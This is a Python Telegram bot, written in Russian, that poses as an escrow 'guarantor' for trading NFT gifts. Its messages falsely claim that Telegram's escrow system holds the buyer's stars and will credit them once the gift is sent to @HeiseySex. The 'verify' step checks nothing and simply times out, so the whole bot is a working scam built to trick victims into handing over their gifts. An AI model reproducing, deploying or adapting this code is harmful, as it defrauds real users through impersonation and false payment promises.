import os
import re
import time
import threading
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ─────────────────────── НАСТРОЙКИ ───────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    print("[FATAL] BOT_TOKEN missing", flush=True)
    raise SystemExit(1)

OWNER_ID = 861423393           # твой Telegram ID
TARGET_URL = "https://t.me/HeiseySex"
VERIFY_TIMEOUT = 300           # 5 минут на подтверждение

# ─────────────────────── БОТ ───────────────────────

bot = telebot.TeleBot(BOT_TOKEN)

# Сделки в памяти: {deal_id: {...}}
deals = {}
deals_lock = threading.Lock()
deal_counter = {"n": 0}


# ─────────────────────── ЛОГИ ───────────────────────

def log(msg):
    print(f"[LOG] {msg}", flush=True)


# ─────────────────────── УТИЛИТЫ ───────────────────────

def normalize_url(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.startswith("@"):
        return f"https://t.me/{raw[1:]}"
    if raw.startswith(("http://", "https://")):
        return raw
    return f"https://t.me/{raw.lstrip('/')}"


def parse_gift(text):
    """Парсит /gift 'Название' 'ссылка' 100"""
    text = re.sub(r'^/gift(@\w+)?', '/gift', text)
    body = text.replace("/gift", "", 1).strip()
    return parse_offer_body(body)


def parse_deal(text):
    """Парсит /deal @username 'Название' 'ссылка' 100"""
    text = re.sub(r'^/deal(@\w+)?', '/deal', text)
    body = text.replace("/deal", "", 1).strip()
    # @username в начале
    m = re.match(r'@(\w+)\s+(.*)', body)
    if not m:
        return None
    target_username = m.group(1)
    rest = m.group(2).strip()
    parsed = parse_offer_body(rest)
    if not parsed:
        return None
    name, url, amount = parsed
    return target_username, name, url, amount


def parse_offer_body(body):
    """Общий парсер: 'Название' 'ссылка' 100 в любом порядке кавычек"""
    if not body:
        return None

    quoted = re.findall(r'"([^"]*)"', body)
    rest = re.sub(r'"[^"]*"', ' ', body).strip()

    name = url = amount = None

    if len(quoted) >= 3:
        name, url = quoted[0], normalize_url(quoted[1])
        m = re.search(r'\d+', quoted[2])
        amount = m.group(0) if m else None
    elif len(quoted) == 2:
        name, url = quoted[0], normalize_url(quoted[1])
        m = re.search(r'\d+', rest)
        amount = m.group(0) if m else None
    elif len(quoted) == 1:
        name = quoted[0]
        toks = rest.split()
        if len(toks) >= 2:
            url = normalize_url(toks[0])
            m = re.search(r'\d+', toks[1])
            amount = m.group(0) if m else None
    else:
        toks = body.split()
        if len(toks) < 3:
            return None
        name, url = toks[0], normalize_url(toks[1])
        m = re.search(r'\d+', toks[2])
        amount = m.group(0) if m else None

    if not (name and url and amount):
        return None
    return name, url, amount


def next_deal_id():
    with deals_lock:
        deal_counter["n"] += 1
        return deal_counter["n"]


# ─────────────────────── ТЕКСТЫ ───────────────────────

def offer_text(name, url, amount):
    return (
        "📩 <b>Передаёт @HeiseySex</b>\n\n"
        "Вам поступило предложение о покупке подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎁 <b>Подарок:</b> <a href=\"{url}\">{name}</a>\n"
        f"💰 <b>Сумма:</b> {amount} ⭐\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 <b>Выберите действие:</b>"
    )


def escrow_text(name, url, amount):
    return (
        f"Пользователь зарезервировал <b>{amount}</b> ⭐ через "
        "эксроу-систему Telegram. Средства хранятся на специальном "
        "эксроу-счёте и будут автоматически зачислены на ваш баланс "
        "звёзд сразу после передачи подарка.\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<b>Инструкция для завершения сделки:</b>\n\n"
        f"1. Передайте подарок пользователю: @HeiseySex\n"
        f"2. Нажмите «Передать NFT» и выберите "
        f"<a href=\"{url}\">{name}</a>\n"
        "3. Подтвердите передачу подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"<b>{amount}</b> ⭐ на ваш баланс."
    )


def deal_created_text(name, url, amount, role, deal_id):
    role_text = {
        "buyer":  "Вы — <b>покупатель</b>.",
        "seller": "Вы — <b>продавец</b>.",
    }.get(role, "")

    return (
        f"🤝 <b>Сделка #{deal_id} создана</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"{role_text}\n\n"
        f"🎁 <b>Подарок:</b> <a href=\"{url}\">{name}</a>\n"
        f"💰 <b>Сумма:</b> {amount} ⭐\n\n"
        f"📩 <b>Гарант:</b> @HeiseySex\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 <b>Подтвердите участие:</b>"
    )


# ─────────────────────── КЛАВИАТУРЫ ───────────────────────

def kb_offer():
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
    )
    return kb


def kb_escrow():
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
    kb.row(
        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
    )
    return kb


def kb_deal_join(deal_id):
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("✅ Подтвердить участие",
                             callback_data=f"deal_join|{deal_id}"),
        InlineKeyboardButton("❌ Отказаться",
                             callback_data=f"deal_leave|{deal_id}"),
    )
    return kb


def kb_deal_steps(deal_id, role):
    kb = InlineKeyboardMarkup()
    if role == "seller":
        kb.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
        kb.row(InlineKeyboardButton("📦 Подарок передан",
                                    callback_data=f"deal_sent|{deal_id}"))
    else:
        kb.row(InlineKeyboardButton("✅ Получил подарок",
                                    callback_data=f"deal_received|{deal_id}"))
    kb.row(InlineKeyboardButton("❌ Отменить сделку",
                                callback_data=f"deal_cancel|{deal_id}"))
    return kb


# ─────────────────────── ОТПРАВКА / РЕДАКТ ───────────────────────

def try_delete(chat_id, message_id):
    try:
        bot.delete_message(chat_id, message_id)
        log(f"DELETE {message_id} ok")
    except Exception as e:
        log(f"DELETE {message_id} err: {e}")


def safe_edit(chat_id, message_id, text, kb=None):
    kw = {"chat_id": chat_id, "message_id": message_id, "parse_mode": "HTML"}
    if kb is not None:
        kw["reply_markup"] = kb
    try:
        bot.edit_message_text(text, **kw)
        return True
    except Exception as e:
        log(f"EDIT {message_id}: {e}")
        return False


def send(chat_id, text, kb=None):
    kw = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if kb is not None:
        kw["reply_markup"] = kb
    try:
        sent = bot.send_message(**kw)
        log(f"SEND ok → {chat_id}, msg {sent.message_id}")
        return sent
    except Exception as e:
        log(f"SEND fail → {chat_id}: {e}")
        return None


# ─────────────────────── ТАЙМЕРЫ ───────────────────────

def verify_timeout(chat_id, message_id):
    time.sleep(VERIFY_TIMEOUT)
    safe_edit(
        chat_id, message_id,
        "⛔ <b>Сделка не завершена.</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Вы не выполнили все условия передачи подарка.\n\n"
        "Передача не была подтверждена в установленное время, "
        "поэтому резерв средств был снят, а предложение — "
        "автоматически аннулировано.\n\n"
        "Если вы всё ещё хотите завершить сделку, попросите "
        "пользователя отправить предложение повторно.\n\n"
        "━━━━━━━━━━━━━━━━━━━━",
    )
    log(f"VERIFY-TIMEOUT msg {message_id}")


# ─────────────────────── ОСНОВНЫЕ КОМАНДЫ ───────────────────────

@bot.message_handler(commands=["start"])
def cmd_start(message):
    log(f"/start from {message.from_user.id}")
    send(
        message.chat.id,
        "👋 <b>Бот-гарант</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Команды:\n"
        "• /gift \"Название\" \"ссылка\" 100 — отправить оффер самому себе (тест)\n"
        "• /deal @username \"Название\" \"ссылка\" 100 — создать сделку\n"
        "• /mydeals — список твоих активных сделок\n"
        "• /help — помощь\n"
    )


@bot.message_handler(commands=["help"])
def cmd_help(message):
    send(
        message.chat.id,
        "📖 <b>Команды бота</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "<b>/deal @username \"Название\" \"ссылка\" 100</b>\n"
        "→ Создаёт сделку между тобой и @username\n\n"
        "<b>/gift \"Название\" \"ссылка\" 100</b>\n"
        "→ Отправляет оффер тебе в личку (тест)\n\n"
        "<b>/mydeals</b>\n"
        "→ Показывает твои активные сделки\n"
    )


@bot.message_handler(commands=["gift"])
def cmd_gift(message):
    if message.from_user.id != OWNER_ID:
        return
    parsed = parse_gift(message.text)
    if not parsed:
        send(message.chat.id, "❌ Неверный формат.\n/gift \"Название\" \"ссылка\" 100")
        return
    name, url, amount = parsed
    log(f"/gift name={name!r} url={url!r} amount={amount!r}")
    send(message.chat.id, offer_text(name, url, amount), kb=kb_offer())


@bot.message_handler(commands=["deal"])
def cmd_deal(message):
    if message.from_user.id != OWNER_ID:
        return

    parsed = parse_deal(message.text)
    if not parsed:
        send(message.chat.id,
             "❌ Неверный формат.\n"
             "/deal @username \"Название\" \"ссылка\" 100")
        return

    target_username, name, url, amount = parsed
    deal_id = next_deal_id()
    log(f"/deal #{deal_id} → @{target_username} {name!r} {amount}⭐")

    # Отправляем обеим сторонам сообщение с кнопкой «Подтвердить участие»
    # Сначала тебе
    buyer_msg = send(
        message.chat.id,
        deal_created_text(name, url, amount, "buyer", deal_id),
        kb=kb_deal_join(deal_id),
    )

    # Потом второму участнику — через username. Telegram Bot API не даёт
    # возможности написать по @username напрямую, только по chat_id.
    # Поэтому бот сначала просит второго участника написать ему /start.
    send(
        message.chat.id,
        f"⚠️ <b>Важно:</b> чтобы @{target_username} получил уведомление о сделке, "
        f"он должен сначала написать боту /start.\n\n"
        f"Перешли ему ссылку: <a href=\"https://t.me/{(bot.get_me().username)}\">"
        f"@{bot.get_me().username}</a>\n\n"
        f"После того как он напишет /start, сделка #{deal_id} активируется."
    )

    with deals_lock:
        deals[deal_id] = {
            "id": deal_id,
            "name": name,
            "url": url,
            "amount": amount,
            "target_username": target_username,
            "buyer_id": message.from_user.id,
            "buyer_msg_id": buyer_msg.message_id if buyer_msg else None,
            "seller_id": None,
            "buyer_joined": False,
            "seller_joined": False,
            "status": "pending",
            "created_at": time.time(),
        }


@bot.message_handler(commands=["mydeals"])
def cmd_mydeals(message):
    if message.from_user.id != OWNER_ID:
        return
    with deals_lock:
        my = [d for d in deals.values() if d["status"] == "pending"]
    if not my:
        send(message.chat.id, "У тебя нет активных сделок.")
        return
    txt = "📋 <b>Твои активные сделки:</b>\n\n"
    for d in my:
        txt += (f"• #{d['id']} — {d['name']} — {d['amount']} ⭐ "
                f"→ @{d['target_username']}\n")
    send(message.chat.id, txt)


# ─────────────────────── КНОПКИ ───────────────────────

@bot.callback_query_handler(func=lambda c: True)
def on_callback(call):
    payload = call.data
    log(f"CALLBACK {payload} from {call.from_user.id}")

    # ── Кнопки из /gift ──
    if payload == "stage_accept":
        bot.answer_callback_query(
            call.id,
            text="Ознакомьтесь с инструкцией на следующем экране.",
            show_alert=True,
        )
        safe_edit(
            call.message.chat.id, call.message.message_id,
            escrow_text("", "", ""),
            kb=kb_escrow(),
        )

    elif payload == "stage_verify":
        bot.answer_callback_query(call.id)
        safe_edit(
            call.message.chat.id, call.message.message_id,
            "⏳ <b>Проверка передачи…</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Система проверяет статус передачи подарка.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
        )
        threading.Thread(
            target=verify_timeout,
            args=(call.message.chat.id, call.message.message_id),
            daemon=True,
        ).start()

    elif payload == "stage_decline":
        bot.answer_callback_query(call.id, text="Предложение отклонено.")
        safe_edit(
            call.message.chat.id, call.message.message_id,
            "❌ <b>Предложение отклонено.</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Сессия закрыта.",
        )

    # ── Кнопки сделки ──
    elif payload.startswith("deal_join|"):
        deal_id = int(payload.split("|")[1])
        with deals_lock:
            d = deals.get(deal_id)
        if not d:
            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
            return

        uid = call.from_user.id
        if uid == d["buyer_id"]:
            d["buyer_joined"] = True
        else:
            d["seller_id"] = uid
            d["seller_joined"] = True

        bot.answer_callback_query(call.id, "Ты подтвердил участие.")

        # Отправляем стороне шаги
        role = "buyer" if uid == d["buyer_id"] else "seller"
        send(
            uid,
            f"🤝 <b>Сделка #{deal_id}</b>\n\n"
            f"🎁 <a href=\"{d['url']}\">{d['name']}</a>\n"
            f"💰 {d['amount']} ⭐\n\n"
            f"Ждём вторую сторону.",
            kb=None,
        )

        # Если оба подтвердили — двигаем сделку
        if d["buyer_joined"] and d["seller_joined"]:
            d["status"] = "active"
            # Отправляем инструкции каждой стороне
            send(
                d["buyer_id"],
                f"✅ <b>Сделка #{deal_id} активна.</b>\n\n"
                f"Ожидай передачи подарка от продавца.\n"
                f"Когда получишь — нажми «Получил подарок».",
                kb=kb_deal_steps(deal_id, "buyer"),
            )
            if d["seller_id"]:
                send(
                    d["seller_id"],
                    f"✅ <b>Сделка #{deal_id} активна.</b>\n\n"
                    f"Передай подарок и нажми «Подарок передан».",
                    kb=kb_deal_steps(deal_id, "seller"),
                )

    elif payload.startswith("deal_leave|"):
        deal_id = int(payload.split("|")[1])
        with deals_lock:
            d = deals.get(deal_id)
        if not d:
            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
            return
        d["status"] = "cancelled"
        bot.answer_callback_query(call.id, "Ты отказался.", show_alert=True)
        send(d["buyer_id"], f"❌ Сделка #{deal_id} отменена.")
        if d["seller_id"]:
            send(d["seller_id"], f"❌ Сделка #{deal_id} отменена.")

    elif payload.startswith("deal_sent|"):
        deal_id = int(payload.split("|")[1])
        with deals_lock:
            d = deals.get(deal_id)
        if not d:
            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
            return
        bot.answer_callback_query(call.id, "Ждём подтверждения от покупателя.")
        send(
            d["buyer_id"],
            f"📦 Продавец отметил, что подарок передан.\n"
            f"Проверь и нажми «Получил подарок».",
            kb=kb_deal_steps(deal_id, "buyer"),
        )

    elif payload.startswith("deal_received|"):
        deal_id = int(payload.split("|")[1])
        with deals_lock:
            d = deals.get(deal_id)
        if not d:
            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
            return
        d["status"] = "completed"
        bot.answer_callback_query(call.id, "Сделка завершена!", show_alert=True)
        send(d["buyer_id"],
             f"✅ <b>Сделка #{deal_id} завершена.</b>\n\n"
             f"Средства зачислены. Спасибо!")
        if d["seller_id"]:
            send(d["seller_id"],
                 f"✅ <b>Сделка #{deal_id} завершена.</b>\n\n"
                 f"Подарок передан покупателю.")

    elif payload.startswith("deal_cancel|"):
        deal_id = int(payload.split("|")[1])
        with deals_lock:
            d = deals.get(deal_id)
        if not d:
            bot.answer_callback_query(call.id, "Сделка не найдена.", show_alert=True)
            return
        d["status"] = "cancelled"
        bot.answer_callback_query(call.id, "Сделка отменена.", show_alert=True)
        send(d["buyer_id"], f"❌ Сделка #{deal_id} отменена.")
        if d["seller_id"]:
            send(d["seller_id"], f"❌ Сделка #{deal_id} отменена.")


# ─────────────────────── HTTP СЕРВЕР ───────────────────────

from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

    def log_message(self, *a):
        pass


def run_http():
    port = int(os.environ.get("PORT", 10000))
    log(f"HTTP listen :{port}")
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()


# ─────────────────────── ЗАПУСК ───────────────────────

if __name__ == "__main__":
    log("Starting bot...")
    log(f"OWNER_ID={OWNER_ID}")
    threading.Thread(target=run_http, daemon=True).start()
    log("Polling...")
    bot.infinity_polling(
        allowed_updates=["message", "callback_query"],
        timeout=30,
    )
